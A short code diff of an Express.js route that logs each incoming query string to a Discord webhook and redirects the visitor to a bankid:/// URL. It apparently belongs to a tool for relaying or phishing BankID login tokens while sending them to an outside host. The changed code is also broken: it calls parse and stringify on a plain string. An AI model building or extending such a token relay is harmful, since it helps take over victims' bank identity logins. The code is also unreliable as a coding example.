@@ -12,21 +12,31 @@
  
  app.get('/', (req, res) => {
   // Extract the query string from req.originalUrl
-  const queryString = req.originalUrl;
+  const queryString = req.originalUrl.split('?')[1];
 
   if (!queryString) {
     return res.status(400).send('Query parameters are required.');
   }
 
-  // Log the query string to console or webhook
+  // Parse the query string
+  const parsedQuery = queryString.parse(queryString);
+
+  // Remove '=' from query parameters
+  const formattedParams = {};
+  for (let key in parsedQuery) {
+    formattedParams[key] = parsedQuery[key].replace(/=/g, '');
+  }
+
+  // Log the formatted query string to console or webhook
   sendDiscordWebhook(queryString);
 
-  // Construct the redirect URL with the extracted query parameters
-  const redirectUrl = `bankid:///?autostarttoken=${queryString}`;
+  // Construct the redirect URL with the formatted query parameters
+  const redirectUrl = `bankid:///?${queryString.stringify(formattedParams)}`;
 
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
+
 
  
    // Function to send Discord webhook
